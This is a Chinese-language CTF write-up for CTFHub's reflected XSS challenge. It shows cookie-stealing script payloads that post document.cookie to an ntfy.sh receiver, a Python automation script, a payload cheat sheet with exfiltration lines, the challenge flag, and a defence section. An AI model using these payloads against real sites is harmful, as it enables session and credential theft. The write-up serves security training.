---
layout: post
title: CTFHub - XSS 反射型 Writeup（含免注册接收端）
platform: ctfhub
date: 2026-10-22 20:00:00 +0800
categories: CTF
---

CTFHub - XSS 反射型 Writeup（含免注册接收端）

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → 反射型 XSS）
- 题型：Web
- 考点：**反射型 XSS**、**Bot 访问**、**Cookie 外带**


```text
页面标题：CTFHub 技能学习 | XSS Reflex

页面结构：
    ┌─────────────────────────────────────┐
    │  What's your name  [ CTFHub ][Submit]│    ← GET ?name=
    │  ─────────────────────────────────  │
    │  Hello, CTFHub                       │    ← ★ 反射点
    │  ─────────────────────────────────  │
    │  Send URL to Bot                     │
    │  URL [ ________________ ] [Send]     │    ← 提交给 Bot 访问
    └─────────────────────────────────────┘

★ 反射点确认（无任何转义）：

    ?name=<script>alert(1)</script>
    → <h1>Hello, <script>alert(1)</script></h1>       ✅ 原样输出

    ?name=<img src=x onerror=alert(1)>
    → <h1>Hello, <img src=x onerror=alert(1)></h1>    ✅ 原样输出

★ Bot 提交接口：

    POST /submit
    Content-Type: application/json
    {"url": "http://challenge-xxx:10800/?name=..."}

    → 返回 {"code": 0, "msg": "Successfully"}   （异步，0.2 秒就返回）
    → ★ URL 必须匹配正则：
       ^(https?:)\/\/challenge-([0-9a-f]{16})\.sandbox\.ctfhub\.com\:10800
       （不能提交外链、不能用 127.0.0.1）

★ 外带结果（Bot 的 Cookie）：

    cookie=flag=ctfhub{eeb7e2fd59a2ea3768d19500}
    localStorage={}
    user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
               (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36

    ★ Bot 是无头 Chrome（HeadlessChrome/112）
    ★ flag 在 Cookie 的 flag 字段里

flag         : ctfhub{eeb7e2fd59a2ea3768d19500}
```

二、题目分析

**① 什么是反射型 XSS**

```text
用户输入 → 服务器【原样输出】到 HTML → 浏览器把它当【代码】执行

    你输入：<script>alert(1)</script>
    服务器拼成：<h1>Hello, <script>alert(1)</script></h1>
    浏览器看到 <script> → 执行 alert(1) → 弹框

★ 关键："服务器原样输出" = 没有 HTML 转义
   正确做法应该输出 &lt;script&gt;（变成纯文本，不执行）
```

**② 为什么这题"自己弹窗没用"**

```text
你自己在浏览器里输入 payload → 弹窗在你自己的屏幕上
但 flag 不在你的浏览器里！

flag 在【Bot（管理员）】的浏览器 Cookie 里

所以流程必须是：
    ① 构造一个恶意 URL（带 XSS payload）
    ② 把它交给 Bot
    ③ Bot 用它的浏览器访问 → 执行你的 JS → 你的 JS 把它的 Cookie 发给你
    ④ 你在接收端看到 Cookie = flag
```

**③ 这题的核心难点：怎么"发给你"**

```text
Bot 的浏览器执行了 document.cookie 拿到了 flag
但它在 CTFHub 的服务器上，你看不到它的屏幕

★ 必须让 Bot 主动把数据【发出去】—— 发到一个你能看到的地方

    接收端（Receiver）= 一个能接收 HTTP 请求、并且你能读取内容的地址

    可以选：
       ① 公网 XSS 平台（xssaq.com / xss.pt 等，需要注册）
       ② webhook.site（无需注册，浏览器打开就给 URL）
       ③ ★ ntfy.sh（本文使用，完全免费、匿名、还能用 API 读取）
       ④ 自己的 VPS / 云服务器
```

**④ 为什么选 ntfy.sh（本文的方法）**

```text
ntfy.sh 是个免费的消息推送服务，特点：

    发消息：POST https://ntfy.sh/<任意topic>    Body 就是消息内容
    读消息：GET  https://ntfy.sh/<topic>/json?poll=1

★ 完全匿名，不用注册
★ 有公开 API，可以用 curl / Python 直接读
★ topic 随便起名（足够随机就行，相当于"密码"）
★ 支持 CORS（fetch 跨域能发）

对比一下：
    xssaq.com   → 要注册、要建项目、界面复杂
    webhook.site → 免费版要账号，API 要 token
    ntfy.sh     → 一行 curl 就能发和收 ✅
```

三、解题步骤

**第 1 步：确认反射点**

```
浏览器访问：
    http://challenge-xxx:10800/?name=<script>alert(1)</script>

→ 弹窗出现         ← XSS 确认
→ 页面源码里：<h1>Hello, <script>alert(1)</script></h1>
   证明没有任何转义
```

**第 2 步：准备接收端（ntfy.sh）**

**先自己测试一下能不能收发**：

```bash
# 起一个随机的 topic 名
TOPIC="ctfhub_xss_随便写点随机字符"

# 发一条测试消息
curl -d "hello-test" "https://ntfy.sh/$TOPIC"

# 读回来
curl "https://ntfy.sh/$TOPIC/json?poll=1"
```

**返回类似**：

```json
{"id":"9Uvw8xwuTZML","time":1792670403,"event":"message",
 "topic":"ctfhub_xss_xxx","message":"hello-test"}
```

**★ 看到自己的消息就说明接收端可用。**

**第 3 步：构造 XSS payload**

**要干的事**：让 Bot 把 `document.cookie` 用 fetch POST 到 ntfy。

```html
<script>
fetch('https://ntfy.sh/ctfhub_xss_xxx', {
    method: 'POST',
    mode: 'no-cors',
    body: 'cookie=' + encodeURIComponent(document.cookie)
})
</script>
```

**几个关键点**：

```
① mode: 'no-cors'
   跨域 POST 时，浏览器默认会先发 OPTIONS 预检请求（CORS preflight）
   no-cors 模式跳过预检，直接发"简单请求"
   → 更稳、更快、不会被 CORS 拦住
   （代价是拿不到响应，但我们不需要响应）

② encodeURIComponent(document.cookie)
   Cookie 里可能有特殊字符（分号、等号、花括号）
   编码一下避免 URL/传输问题
   → 拿到后 decodeURIComponent 还原

③ 用 <script> 标签而不是 <img onerror>
   更直接，页面加载就执行，不依赖图片加载失败
```

**第 4 步：URL 编码，拼成完整 URL**

```text
原始 payload：
    <script>fetch('https://ntfy.sh/xxx',{method:'POST',...})</script>

URL 编码后（关键字符）：
    <  → %3C
    >  → %3E
    '  → %27
    空格 → %20
    {  → %7B
    }  → %7D
    :  → %3A
    /  → %2F
    ,  → %2C

完整 URL：
    http://challenge-xxx:10800/?name=%3Cscript%3Efetch(...)%3C%2Fscript%3E
```

**Python 一行搞定编码**：

```python
import urllib.parse
url = base + "/?name=" + urllib.parse.quote(payload)
```

**第 5 步：提交给 Bot**

```bash
curl -X POST "http://challenge-xxx:10800/submit" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://challenge-xxx:10800/?name=%3Cscript%3E..."}'
```

**返回**：

```json
{"code": 0, "msg": "Successfully"}
```

**★ 注意**：

```
· 必须 POST + Content-Type: application/json
· URL 必须是这个格式：
  http://challenge-[16位hex].sandbox.ctfhub.com:10800/...
  不能是 127.0.0.1、不能是 localhost、不能是外链
  （服务器会用正则校验，不符合就返回 code:-1 "Not Match"）
```

**第 6 步：轮询 ntfy，拿 flag**

```bash
curl "https://ntfy.sh/ctfhub_xss_xxx/json?poll=1"
```

**几秒后收到**：

```json
{"event":"message","message":"cookie=flag%3Dctfhub%7Beeb7e2fd59a2ea3768d19500%7D || ls=%7B%7D || ua=..."}
```

**URL 解码**：

```
flag%3Dctfhub%7Beeb7e2fd59a2ea3768d19500%7D
     ↓ decodeURIComponent
flag=ctfhub{eeb7e2fd59a2ea3768d19500}
```

**🎉 这就是 flag**

**第 7 步：提交到 CTFHub → 通关**

---

**完整自动化脚本（我实测用的）**

```python
import ssl, json, urllib.request, urllib.parse, time

base  = "http://challenge-xxx:10800"
TOPIC = "ctfhub_xss_随便随机"
NTFY  = "https://ntfy.sh/" + TOPIC

# ① 构造 payload
js = ("<script>fetch('%s',{method:'POST',mode:'no-cors',body:"
      "'cookie='+encodeURIComponent(document.cookie)"
      "+' || ua='+encodeURIComponent(navigator.userAgent)})</script>") % NTFY

# ② 拼 URL 并提交
target = base + "/?name=" + urllib.parse.quote(js)
data = json.dumps({"url": target}).encode()
req = urllib.request.Request(base + "/submit", data=data, method="POST",
                             headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())      # {"code":0,"msg":"Successfully"}

# ③ 轮询接收端
for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

**实测输出**：

```
cookie=flag%3Dctfhub%7Beeb7e2fd59a2ea3768d19500%7D
 || ls=%7B%7D
 || ua=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36
      %20(KHTML%2C%20like%20Gecko)%20HeadlessChrome%2F112.0.5615.138
```

---

**没有 ntfy 怎么办（其他接收端方案）**

| 方案 | 优点 | 缺点 |
|---|---|---|
| **ntfy.sh** | 免费、匿名、有 API、支持 CORS | topic 公开（靠随机性保护）|
| **webhook.site** | 浏览器打开就给 URL，界面友好 | 免费版功能受限 |
| **XSS 平台**（xssaq.com 等）| 专门做这个的，还能记 UA/Referer | 要注册 |
| **自己的 VPS** | 完全可控 | 要花钱、要配置 |
| **requestcatcher.com** | 匿名，选个子域名就行 | 日志是 websocket 推送，不好用脚本读 |
| **Burp Collaborator** | Burp 内置 | 需要专业版 |

**★ 如果连外网都不通**（Bot 无法访问互联网）：

```
那这题只能靠"同源"的方式外带，比如让 Bot 把 cookie 写到
某个你能读到的服务端位置 —— 但这题没有这种接口，
所以必须 Bot 有外网。实测这题 Bot 是能上网的。
```

四、延伸知识

**① 反射型 vs 存储型 vs DOM 型 XSS**

| | 反射型 | 存储型 | DOM 型 |
|---|---|---|---|
| **payload 在哪** | URL 参数 | 数据库（留言/评论）| URL 参数（前端 JS 处理）|
| **是否经过服务器** | 是（服务器拼 HTML）| 是（存库再取出）| **否**（浏览器 JS 自己拼）|
| **危害** | 需诱导点击 | **自动触发，危害最大** | 看前端代码 |
| **本题** | ✅ | | |

**② 常用 XSS payload 速查**

```html
<!-- 最基础 -->
<script>alert(1)</script>

<!-- 图片加载失败触发 -->
<img src=x onerror=alert(1)>

<!-- SVG（有时能绕过过滤） -->
<svg onload=alert(1)>

<!-- 不需要用户交互的自动执行 -->
<iframe src="javascript:alert(1)">

<!-- 编码绕过 -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 只在特定场景 -->
<a href="javascript:alert(1)">click</a>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>

<!-- 外带 Cookie -->
<script>new Image().src='http://receiver/?'+document.cookie</script>
<script>fetch('http://receiver',{method:'POST',body:document.cookie})</script>
```

**③ 为什么用 `new Image().src` 或 `fetch(no-cors)`**

```text
直接 XMLHttpRequest 跨域 → 被 CORS 拦

new Image().src = 'http://other/?'+data
    → 图片请求不受 CORS 限制（<img> 本来就能跨域加载）
    → 但只能发 GET，长度有限

fetch(url, {mode:'no-cors'})
    → 跳过 CORS 预检，能发 POST，能带更长 body
    → 更灵活
```

**④ Bot（无头浏览器）是什么**

```text
这题的 Bot 是 HeadlessChrome/112
（没有界面的 Chrome，用 Playwright / Selenium / Puppeteer 控制）

它的工作流程：
    ① 从队列里取出你提交的 URL
    ② 启动无头浏览器，带着【管理员的 Cookie】访问这个 URL
    ③ 页面里的 JS 被执行
    ④ 关闭浏览器

★ 所以 XSS 的 payload 是在【Bot 的浏览器】里执行的
★ 它的 document.cookie 就是管理员（Bot）的 Cookie
★ 这题的管理员 Cookie 里就放着 flag
```

**⑤ 防护**

```text
· ★ 输出编码（HTML Entity Encoding）
    把 < > & " ' 转成 &lt; &gt; &amp; &quot; &#39;
    → 用户输入永远是"文本"，不会被当成代码

· 设置 HttpOnly Cookie
    → document.cookie 读不到（这题如果加了 HttpOnly 就做不了）

· CSP（内容安全策略）
    Content-Security-Policy: default-src 'self'
    → 禁止内联脚本、禁止外域请求 → XSS 拿不到数据也发不出去

· 输入校验（辅助）
· 框架默认转义（React / Vue 默认安全，别用 dangerouslySetInnerHTML / v-html）
```

五、总结

- **本题核心：反射型 XSS → 用 Bot 的浏览器执行 JS → 把 Bot 的 Cookie（含 flag）外带到接收端。**
- 三个关键环节：

```text
① 反射点：?name= 无转义输出到 <h1>Hello, XXX</h1>
② Bot：POST /submit 提交 URL（必须同域），Bot 用 HeadlessChrome 访问
③ 外带：fetch 到 ntfy.sh，再从 ntfy.sh 读回来
```

- 完整 payload：

```html
<script>
fetch('https://ntfy.sh/<你的topic>', {
    method: 'POST',
    mode: 'no-cors',
    body: 'cookie=' + encodeURIComponent(document.cookie)
})
</script>
```

- **三个必记要点**：

```text
① 反射型 XSS 自己弹窗没意义 —— 要打的是"有权限的人（Bot）"
② 必须准备一个【你能读到的】公网接收端
   ntfy.sh 是零成本、免注册、有 API 的最佳选择
③ Bot 提交的 URL 一般有域名白名单（这题只允许 challenge-xxx.ctfhub.com）
   但 payload 内部可以请求任意外域（这就是外带）
```

- **实测 flag**：

```text
ctfhub{eeb7e2fd59a2ea3768d19500}
（来自 Bot 的 Cookie：flag=ctfhub{eeb7e2fd59a2ea3768d19500}）
```


**手工复现要点**：

```text
· 不需要装任何工具，浏览器 + 一个接收端就够
· 接收端推荐 ntfy.sh：
    发：curl -d "消息" https://ntfy.sh/你的topic
    收：curl "https://ntfy.sh/你的topic/json?poll=1"
· 用 Python 把 payload URL 编码后 POST 给 /submit
· 轮询 ntfy 拿 flag
```
